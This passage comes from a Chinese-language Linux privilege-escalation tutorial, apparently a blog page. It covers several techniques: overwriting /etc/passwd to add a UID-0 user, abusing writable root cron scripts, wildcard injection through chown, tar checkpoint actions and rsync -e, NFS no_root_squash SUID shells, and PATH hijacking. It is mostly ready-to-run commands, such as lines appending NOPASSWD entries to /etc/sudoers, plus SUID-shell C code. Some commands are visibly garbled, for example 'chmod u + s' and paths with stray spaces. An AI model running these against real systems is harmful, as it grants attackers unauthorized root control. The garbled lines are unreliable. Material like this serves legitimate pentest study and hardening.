id="mv命令利用"><a href="#mv命令利用" class="headerlink" title="mv命令利用"></a>mv命令利用</h4><p>覆盖 &#x2F;etc&#x2F;shadow 或 &#x2F;etc&#x2F;passwd</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">[zabbix<span class="hljs-variable">@localhost</span> ~]<span class="hljs-variable">$ </span>cat /etc/passwd &gt;passwd[zabbix<span class="hljs-variable">@localhost</span> ~]<span class="hljs-variable">$ </span>openssl passwd <span class="hljs-number">-1</span> -salt hack hack123<span class="hljs-variable">$1</span><span class="hljs-variable">$hack</span><span class="hljs-variable">$WTn0dk2QjNeKfl</span>.<span class="hljs-title class_">DHOUue0</span>[zabbix<span class="hljs-variable">@localhost</span> ~]<span class="hljs-variable">$ </span>echo <span class="hljs-string">&#x27;hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash&#x27;</span> &gt;&gt; passwd[zabbix<span class="hljs-variable">@localhost</span> ~]<span class="hljs-variable">$ </span>mv passwd /etc/passwd[zabbix<span class="hljs-variable">@localhost</span> ~]<span class="hljs-variable">$ </span>su - <span class="hljs-symbol">hackPassword:</span>[root<span class="hljs-variable">@361way</span> ~]<span class="hljs-comment"># iduid=0(hack) gid=0(root) groups=0(root)[root@361way ~]# cat /etc/passwd|tail -1hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash</span><br></code></pre></td></tr></table></figure><h4 id="python-x2F-perl-x2F-ruby-x2F-lua-x2F-php-x2F-etc命令利用"><a href="#python-x2F-perl-x2F-ruby-x2F-lua-x2F-php-x2F-etc命令利用" class="headerlink" title="python&#x2F;perl&#x2F;ruby&#x2F;lua&#x2F;php&#x2F;etc命令利用"></a>python&#x2F;perl&#x2F;ruby&#x2F;lua&#x2F;php&#x2F;etc命令利用</h4><p><strong>python</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;import os;os.system(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><p><strong>perl</strong></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">exec <span class="hljs-string">&quot;/bin/bash&quot;</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h2 id="0x07-Linux提权-利用定时任务（Cron-jobs）"><a href="#0x07-Linux提权-利用定时任务（Cron-jobs）" class="headerlink" title="0x07 Linux提权-利用定时任务（Cron jobs）"></a>0x07 Linux提权-利用定时任务（Cron jobs）</h2><p>如果未正确配置Cronjob，则可以利用该Cronjob获得root特权。</p><p>\1. Cronjob中是否有可写的脚本或二进制文件？<br>2.我们可以覆盖cron文件本身吗？<br>\3. cron.d目录可写吗？</p><p>Cronjob通常以root特权运行。如果我们可以成功篡改cronjob中定义的任何脚本或二进制文件，那么我们可以以root权限执行任意代码。</p><h3 id="Cronjob简介"><a href="#Cronjob简介" class="headerlink" title="Cronjob简介"></a>Cronjob简介</h3><p>Cron Jobs被用于通过在服务器上的特定日期和时间执行命令来安排任务。它们最常用于sysadmin任务，如备份或清理&#x2F;tmp&#x2F;目录等。Cron这个词来自crontab，它存在于&#x2F;etc目录中。</p><p>例如:在crontab内部，我们可以添加以下条目，以每1小时自动打印一次apache错误日志。</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-number">0</span> * * * printf “” &gt; /var/<span class="hljs-keyword">log</span>/apache/error_log<br></code></pre></td></tr></table></figure><p>前五个数字值表示执行cronjob的时间。现在让我们了解五个数字值。</p><ul><li>分钟–第一个值表示介于0到59之间的分钟范围，而*表示任何分钟。</li><li>小时–第二个值表示小时范围在0到24之间，*表示任何小时。</li><li>月中的某天–第三个值表示月中的某日，范围是1到31，*表示任何一天。</li><li>月–第四个值表示1到12之间的月份范围，*表示任何月份。</li><li>星期几–第五个值表示从星期天开始的星期几，介于0到6之间，*表示星期几。</li></ul><h3 id="Cron提权概述"><a href="#Cron提权概述" class="headerlink" title="Cron提权概述"></a>Cron提权概述</h3><p>cron守护程序计划在指定的日期和时间运行命令。它与特定用户一起运行命令。因此，我们可以尝试使用它进行提权。</p><p><strong>Cron信息收集</strong></p><p>收集信息的基本命令，寻找是否能够使用错误配置的cron实现提权。</p><table><thead><tr><th><strong>命令</strong></th><th><strong>结果</strong></th></tr></thead><tbody><tr><td>crontab -l</td><td>显示当前用户的cron</td></tr><tr><td>ls -la &#x2F;etc&#x2F;cron*</td><td>显示计划的作业概述</td></tr></tbody></table><p><strong>查找特权用户拥有且可写的任何内容:</strong></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gradle">crontab -l<br>ls -alh <span class="hljs-regexp">/var/</span>spool/cron<br>ls -al <span class="hljs-regexp">/etc/</span> | <span class="hljs-keyword">grep</span> cron<br>ls -al <span class="hljs-regexp">/etc/</span>cron*<br>cat <span class="hljs-regexp">/etc/</span>cron*<br>cat <span class="hljs-regexp">/etc/</span>at.allow<br>cat <span class="hljs-regexp">/etc/</span>at.deny<br>cat <span class="hljs-regexp">/etc/</span>cron.allow<br>cat <span class="hljs-regexp">/etc/</span>cron.deny<br>cat <span class="hljs-regexp">/etc/</span>crontab<br>cat <span class="hljs-regexp">/etc/</span>anacrontab<br>cat <span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span>crontabs/root<br></code></pre></td></tr></table></figure><p><strong>查看其他用户的crontab</strong></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">$ crontab -u tstark -l0 <span class="hljs-number">0</span> * * * <span class="hljs-regexp">/ jarvis /</span> reboot-arc-reactor<br></code></pre></td></tr></table></figure><p>如果服务器上有很多用户，那么可以在<a href="https://cronitor.io/cron-reference/where-are-cron-logs-stored">cron日志中</a>看到详细信息，可能包含用户名。</p><p>例如，在这里我可以看到运行数据库备份脚本的ubuntu用户:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">8</span>月<span class="hljs-number">5</span>日<span class="hljs-number">4</span>:<span class="hljs-number">05</span>:<span class="hljs-number">01</span> dev01 CRON<span class="hljs-meta"> [2128]:（ubuntu）CMD（/var/cronitor/database-backup.sh）</span><br></code></pre></td></tr></table></figure><p><strong>使用pspy工具（32位为pspy32，64位为pspy64）。</strong></p><p>下载链接:<a href="https://github.com/DominicBreuker/pspy">https</a>:<a href="https://github.com/DominicBreuker/pspy">&#x2F;&#x2F;github.com&#x2F;DominicBreuker&#x2F;pspy</a></p><p><strong>利用配置错误的cronjob获得root访问权限</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">ls</span> -la /etc/cron.d <span class="hljs-comment">#输出cron.d中已经存在的cronjob</span><br><br>find / -perm -2 -<span class="hljs-built_in">type</span> f 2&gt; /dev/null <span class="hljs-comment">#输出可写文件</span><br><br><span class="hljs-built_in">ls</span> -la /usr/local/sbin/cron-logrotate.sh <span class="hljs-comment">#让我们确认cron-logrotate.sh是否可写。</span><br></code></pre></td></tr></table></figure><p>如果我们知道cron-lograte.sh是可写的，它由logrotate cronjob运行。</p><p>那么我们在cron-lograte.sh中编写&#x2F;附加的任何命令都将以root身份执行。</p><p>我们在&#x2F;tmp目录中编写一个C文件并进行编译。</p><p>rootme可执行文件将生成一个shell。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">ls</span> -la rootme <span class="hljs-comment">#它告诉我们它是由用户&#x27;SHayslett&#x27;拥有的</span><br><br>$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;chown root:root /tmp/rootme; chmod u + s /tmp/rootme;&quot;</span> &gt;/usr/local/sbin/cron-logrotate.sh <span class="hljs-comment">#这将更改可执行文件的所有者和组为root。它还将设置SUID位。</span><br><br>$ <span class="hljs-built_in">ls</span> -la rootme <span class="hljs-comment">#5分钟后，运行了logrotate cronjob，并以root特权执行了cron-logrotate.sh。</span><br><br>$ ./rootme <span class="hljs-comment">#生成一个root shell。</span><br></code></pre></td></tr></table></figure><h3 id="Cron脚本覆盖和符号链接"><a href="#Cron脚本覆盖和符号链接" class="headerlink" title="Cron脚本覆盖和符号链接"></a>Cron脚本覆盖和符号链接</h3><h4 id="修改以root权限运行的cron脚本获得shell"><a href="#修改以root权限运行的cron脚本获得shell" class="headerlink" title="修改以root权限运行的cron脚本获得shell"></a>修改以root权限运行的cron脚本获得shell</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27; &gt; &lt;/PATH/CRON/SCRIPT&gt; #Wait until it is executed/tmp/bash -p＃等待执行<br><br>/tmp/bash -p<br></code></pre></td></tr></table></figure><p>如果root用户执行的脚本使用<strong>具有完全访问权限</strong>的<strong>目录</strong>，则删除该文件夹并<strong>创建一个符号链接文件夹到</strong>攻击者可控的脚本的文件夹。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -d -s &lt;/PATH/TO/POINT &gt; &lt;/PATH/CREATE/FOLDER&gt;<br></code></pre></td></tr></table></figure><h4 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h4><p>可以监视进程以搜索每1,2或5分钟执行的进程。可以利用它提权。</p><p>例如，要<strong>在1分钟内每隔0.1s监视一次</strong>，<strong>按执行次数较少的命令排序</strong>并删除一直执行的命令，可以执行以下操作:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">seq</span> 1 610); <span class="hljs-keyword">do</span> ps -e --format cmd &gt;&gt; /tmp/monprocs.tmp; <span class="hljs-built_in">sleep</span> 0.1; <span class="hljs-keyword">done</span>; <span class="hljs-built_in">sort</span> /tmp/monprocs.tmp | <span class="hljs-built_in">uniq</span> -c | grep -v <span class="hljs-string">&quot;\[&quot;</span> | sed <span class="hljs-string">&#x27;/^.\&#123;200\&#125;./d&#x27;</span> | <span class="hljs-built_in">sort</span> | grep -E -v <span class="hljs-string">&quot;\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]&quot;</span>; <span class="hljs-built_in">rm</span> /tmp/monprocs.tmp;<br></code></pre></td></tr></table></figure><p><strong>总结</strong></p><p>由于Cron在执行时以root身份运行&#x2F;etc&#x2F;crontab，因此crontab调用的任何命令或脚本也将以root身份运行。当Cron执行的脚本可由非特权用户编辑时，那些非特权用户可以通过编辑此脚本并等待Cron以root特权执行该脚本来提升其特权!</p><p>例如，假设下面的行在中&#x2F;etc&#x2F;crontab。每天晚上9:30，Cron运行maintenance.sh shell脚本。该脚本在root特权下运行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">30 21 * * * root /path/to/maintenance.sh<br></code></pre></td></tr></table></figure><p>这使得提权变得十分简单。例如，攻击者可以通过将自己添加为sudoer来向自己授予超级用户特权。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">echo <span class="hljs-string">&quot;vickie ALL=(ALL) NOPASSWD:ALL&quot;</span> &gt;&gt; <span class="hljs-regexp">/etc/</span>sudoers<br></code></pre></td></tr></table></figure><p>或者，他们可以通过将新的root用户添加到“ &#x2F;etc &#x2F;passwd”文件来获得root访问权限。由于“ 0”是root用户的UID，因此添加UID为“ 0”的用户将为该用户提供root特权。该用户的用户名为“ vickie”，密码为空:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">echo <span class="hljs-string">&quot;vickie::0:0:System Administrator:/root/root:/bin/bash&quot;</span> &gt;&gt; <span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure><p>等等。</p><h2 id="0x08-Linux提权-通配符注入"><a href="#0x08-Linux提权-通配符注入" class="headerlink" title="0x08 Linux提权-通配符注入"></a>0x08 Linux提权-通配符注入</h2><p>通配符是代表其他字符的符号。您可以将它们与任何命令（例如cat或rm命令）一起使用，以列出或删除符合给定条件的文件。还有其他一些，但是现在对我们很重要的一个是*字符，它可以匹配任意数量的字符。</p><p>例如:</p><ul><li>cat * 显示当前目录中所有文件的内容</li><li>rm * 删除当前目录中的所有文件</li></ul><p>它的工作原理是将*角色扩展到所有匹配的文件。如果我们有文件a，b，c在当前目录中并运行rm *，则结果为rm a b c。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>众所周知，我们可以在命令行中将标志传递给程序以指示其应如何运行。例如，如果我们使用rm -rf而不是，rm那么它将递归并强制删除文件，而无需进一步提示。</p><p>现在，如果我们运行<code>rm *</code>并在当前目录中有一个名为name的文件<code>*</code>将导致命令变为，rm -rf a b c。</p><p>当特权用户或脚本在具有潜在危险标志的命令中使用通配符，尤其是与外部命令执行相关的通配符时，我们可能会使用它来升级特权。</p><h3 id="chown和chmod"><a href="#chown和chmod" class="headerlink" title="chown和chmod"></a>chown和chmod</h3><p>chown和chmod都可以用相同的方式利用，因此我只看看chown。</p><p>Chown是一个程序，可让您更改指定文件的所有者。以下示例将some-file.txt的所有者更改为some-user:</p><p>chown some-user some-file.txt</p><p>Chown具有一个–reference&#x3D;some-reference-file标志，该标志指定文件的所有者应与参考文件的所有者相同。一个例子应该有帮助:</p><p>chown some-user some-file.txt –reference&#x3D;some-reference-file</p><p>假设的所有者some-reference-file是another-user。在这种情况下，所有者some-file.txt将another-user代替some-user。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>假设我们有一个名为弱势程序的脆弱程序，其中包含以下内容:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> some-directory<br><span class="hljs-built_in">chown</span> root *<br></code></pre></td></tr></table></figure><p>在这种情况下，让我们创建一个我们拥有的文件:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> some-directory <br><span class="hljs-built_in">touch</span> reference<br></code></pre></td></tr></table></figure><p>然后我们创建一个文件，并注入标记:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> -- --reference=reference<br></code></pre></td></tr></table></figure><p>如果在同一目录中创建到&#x2F;etc&#x2F;passwd的符号链接，则&#x2F;etc&#x2F;passwd的所有者也将是您，这将使您获得root shell。</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h4 id="TAR"><a href="#TAR" class="headerlink" title="TAR"></a>TAR</h4><p>Tar是一个程序，可让您将文件收集到存档中。</p><p>在tar中，有checkpoint标志，这些标志使您可以在归档指定数量的文件后执行操作。由于我们可以使用通配符注入来注入那些标志，因此我们可以使用checkpoint点来执行我们选择的命令。如果tar以root用户身份运行，则命令也将以root用户身份运行。</p><p>鉴于存在此漏洞，获得root权限的一种简单方法利用sudoer，这将在下面进行说明。</p><h4 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h4><p>假设我们有一个易受攻击的程序，并且使用cron定期运行该程序。该程序包含以下内容:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> important-directory<br>tar cf /var/backups/backup.tar *<br></code></pre></td></tr></table></figure><p>进行根访问的步骤如下:</p><p><strong>1）注入一个标志来指定我们的checkpoint</strong></p><p>首先，我们将指定在归档一个文件之后，有一个检查点。稍后我们将对该检查点执行操作，但是现在我们仅告诉tar它存在。</p><p>让我们创建一个将注入标记的文件:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> important-directory<br><span class="hljs-built_in">touch</span> -- --checkpoint=1 <span class="hljs-comment">#--可以将后面的--checkpoint=1视作创建的文件名而不是选项（如--help）原因未明</span><br></code></pre></td></tr></table></figure><p><strong>2）编写恶意的Shell脚本</strong></p><p>Shell脚本更改sudoers进行提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;echo &quot;my-user ALL=(root) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers&#x27;</span> &gt; demo.sh<br></code></pre></td></tr></table></figure><p>Shell脚本应与通配符位于同一目录中。</p><p>请注意，我们将必须更改my-user为要成为sudoer的实际用户。</p><p><strong>3）注入一个指定检查点动作的标志</strong></p><p>现在，我们将指定，当tar到达在步骤＃1中指定的检查点时，它应运行在步骤＃2中创建的shell脚本:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> -- <span class="hljs-string">&quot;--checkpoint-action=exec=sh demo.sh&quot;</span><br></code></pre></td></tr></table></figure><p><strong>4）root</strong></p><p>等待，直到cron执行了脚本并通过键入以下内容获得root权限。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo su<br></code></pre></td></tr></table></figure><h3 id="rsync"><a href="#rsync" class="headerlink" title="rsync"></a>rsync</h3><p>Rsync是“快速，通用，远程（和本地）文件复制工具”，在linux系统上非常常见。</p><p>与rsync一起使用的一些有趣的标志是:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-e, --rsh=COMMAND      specify the remote shell to use   --rsync-path=PROGRAM  specify the rsync to run on remote machine<br></code></pre></td></tr></table></figure><p>我们可以使用该-e标志来运行所需的任何Shell脚本。让我们创建一个shell脚本，它将我们添加到sudoers文件中:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;echo &quot;my-user ALL=(root) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers&#x27;</span> &gt; shell.sh<br></code></pre></td></tr></table></figure><p>现在让我们注入将运行我们的shell脚本的标志:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> -- <span class="hljs-string">&quot;-e sh shell.sh&quot;</span><br></code></pre></td></tr></table></figure><h2 id="0x09-Linux提权-NFS利用"><a href="#0x09-Linux提权-NFS利用" class="headerlink" title="0x09 Linux提权-NFS利用"></a>0x09 Linux提权-NFS利用</h2><p>如果您在linu服务器上具有低特权shell，并且发现服务器中具有NFS共享，则可以使用它来升级特权。但是成功取决于它的配置方式。</p><h3 id="NFS介绍"><a href="#NFS介绍" class="headerlink" title="NFS介绍"></a>NFS介绍</h3><p>网络文件系统（<strong>NFS</strong>）是一个客户端&#x2F;服务器应用程序，它使计算机用户可以查看和选择存储和更新远程计算机上的文件，就像它们位于用户自己的计算机上一样。在<strong>NFS</strong>协议是几个分布式文件系统标准，网络附加存储（NAS）之一。</p><p>NFS是基于<a href="https://baike.baidu.com/item/UDP/571511">UDP</a>&#x2F;IP协议的应用，其实现主要是采用<a href="https://baike.baidu.com/item/%E8%BF%9C%E7%A8%8B%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8">远程过程调用</a><a href="https://baike.baidu.com/item/RPC/609861">RPC</a>机制，RPC提供了一组与机器、操作系统以及低层传送协议无关的存取远程文件的操作。<a href="https://baike.baidu.com/item/RPC">RPC</a>采用了<a href="https://baike.baidu.com/item/XDR">XDR</a>的支持。<a href="https://baike.baidu.com/item/XDR/8796904">XDR</a>是一种与机器无关的数据描述编码的协议，他以独立与任意机器体系结构的格式对网上传送的数据进行编码和解码，支持在异构系统之间数据的传送。</p><h3 id="root-sqaush和no-root-sqaush"><a href="#root-sqaush和no-root-sqaush" class="headerlink" title="root_sqaush和no_root_sqaush"></a>root_sqaush和no_root_sqaush</h3><p>Root Squashing（root_sqaush）参数阻止对连接到NFS卷的远程root用户具有root访问权限。远程根用户在连接时会分配一个用户“ <strong>nfsnobody</strong>”，它具有最少的本地特权。如果no_root_squash选项开启的话”，并为远程用户授予root用户对所连接系统的访问权限。在配置NFS驱动器时，系统管理员应始终使用“ root_squash”参数。</p><p>&#x3D;&#x3D;对NFS的利用要求squash选项得开启&#x3D;&#x3D;</p><h3 id="利用NFS并获取Root-Shell"><a href="#利用NFS并获取Root-Shell" class="headerlink" title="利用NFS并获取Root Shell"></a>利用NFS并获取Root Shell</h3><p>现在，我们拿到了一个低权限的shell，我们查看“ &#x2F;etc&#x2F;exports ”文件。</p><p><strong>&#x2F;etc&#x2F;exports</strong>文件包含将哪些文件夹&#x2F;文件系统导出到远程用户的配置和权限。</p><p>这个文件的内容非常简单，每一行由抛出路径，客户名列表以及每个客户名后紧跟的访问选项构成:[共享的目录] [主机名或IP(参数,参数)]其中参数是可选的，当不指定参数时，nfs将使用默认选项。默认的共享选项是 sync,ro,root_squash,no_delay。当主机名或IP地址为空时，则代表共享给任意客户机提供服务。当将同一目录共享给多个客户机，但对每个客户机提供的权限不同时，可以这样:[共享的目录] [主机名1或IP1(参数1,参数2)] [主机名2或IP2(参数3,参数4)]</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux.assets/0e6554640dbb494ba4b2faa28d53621d.png" alt="在这里插入图片描述"></p><p>我们可以看到**&#x2F;tmp** 文件夹是可共享的，远程用户可以挂载它。还有不安全的参数“ rw ”（读，写），“ sync ”和“ <strong>no_root_squash</strong>”</p><p>同样我们也可以使用 showmount命令来查看。</p><p>showmount命令用于查询NFS服务器的相关信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># showmount --help</span><br>Usage: showmount [-adehv]<br>[--all] [--directories] [--exports]<br>[--no-headers] [--<span class="hljs-built_in">help</span>] [--version] [host] -a或--all<br></code></pre></td></tr></table></figure><p>以 host:dir 这样的格式来显示客户主机名和挂载点目录。</p><blockquote><p>-d或–directories  仅显示被客户挂载的目录名。</p><p>-e或–exports  显示NFS服务器的输出清单。</p><p>-h或–help  显示帮助信息。</p><p>-v或–version  显示版本信。</p><p>–no-headers  禁止输出描述头部信息。 显示NFS客户端信息 #</p></blockquote><p>showmount 显示指定NFS服务器连接NFS客户端的信息</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs clean"># showmount <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span>  #此ip为nfs服务器的 显示输出目录列表<br><br># showmount -e 显示指定NFS服务器输出目录列表（也称为共享目录列表）<br><br># showmount -e <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span> 显示被挂载的共享目录<br><br># showmount -d   显示客户端信息和共享目录<br><br># showmount -a 显示指定NFS服务器的客户端信息和共享目录<br><br># showmount -a <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span><br></code></pre></td></tr></table></figure><p>这里不多说了</p><p>我们接下来在我们的攻击机上安装客户端工具</p><p>需要执行以下命令，安装nfs-common软件包。apt会自动安装nfs-common、rpcbind等12个软件包</p><p>sudo apt install nfs-commonapt-get install cifs-utils</p><p><strong>然后输入命令</strong></p><p>showmount -e [IP地址]</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux.assets/94b22fbd44e94607bfa97fc12bb5fb5a-164658049401522.png" alt="在这里插入图片描述"></p><p><strong>创建目录以挂载远程系统。</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> / tmp / <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p><strong>在&#x2F;tmp&#x2F;test上装载Remote&#x2F;tmp文件夹:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mount -o rw，vers = 2 [IP地址]:/ tmp / tmp / <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux.assets/3990e063432643aea3ba76bbfc510f8d-164658049401524.png" alt="在这里插入图片描述"></p><p><strong>然后在&#x2F;tmp&#x2F;test&#x2F;中。新建一个c文件。</strong></p><figure class="highlight stan"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stan"><span class="hljs-meta">#include &lt;<span class="hljs-string">stdio.h</span>&gt;</span><br><span class="hljs-meta">#include &lt;<span class="hljs-string">stdlib.h</span>&gt;</span><br><span class="hljs-meta">#include &lt;<span class="hljs-string">sys</span>/<span class="hljs-string">types.h</span>&gt;</span><br><span class="hljs-meta">#include &lt;<span class="hljs-string">unistd.h</span>&gt; <span class="hljs-string">int</span> <span class="hljs-string">main</span>() &#123; <span class="hljs-string">setuid</span>(0); <span class="hljs-string">system</span>(&quot;/<span class="hljs-string">bin</span>/<span class="hljs-string">bash</span>&quot;); <span class="hljs-string">return</span> 0; &#125;</span><br></code></pre></td></tr></table></figure><p><strong>也可以</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;int main() &#123; setgid(0); setuid(0); system(&quot;/bin/bash&quot;); return 0; &#125;&#x27;</span> &gt; /tmp/test/suid-shell.c<br></code></pre></td></tr></table></figure><p><strong>编译:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc /tmp/test/suid-shell.c -o / tmp / 1 / suid-shel<br></code></pre></td></tr></table></figure><p><strong>赋权:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +s /tmp/test/suid-shell.c<br></code></pre></td></tr></table></figure><p><strong>回到要提权的服务器上</strong></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux.assets/6e956b067db24194b6dad1137446a812.png" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> / tmp./suid-shell<br></code></pre></td></tr></table></figure><p><strong>可以看到是ROOT权限了</strong></p><h2 id="0x0A-Linux提权-利用“-”路径配置错误"><a href="#0x0A-Linux提权-利用“-”路径配置错误" class="headerlink" title="0x0A Linux提权-利用“.”路径配置错误"></a>0x0A Linux提权-利用“.”路径配置错误</h2><p>如果在PATH有<code>.</code>的存在，则无需使用<code>./binary</code>即可执行它（使用<code>binary</code>即可）。那么我们将能够执行当前目录中的任何脚本或二进制文件。</p><p>发生这种情况是因为Linux首先在“.”位置搜索程序。再在其他地方搜索。</p><p>在叫<code>ls</code>的文件中，添加了一个代码，该代码将打印“ Hello world”</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux.assets/e772954b9ced4eef9106844ad192a0bd-164658049401527.png" alt="在这里插入图片描述"></p><p>在PATH变量的最前面添加<code>.</code></p><p><img 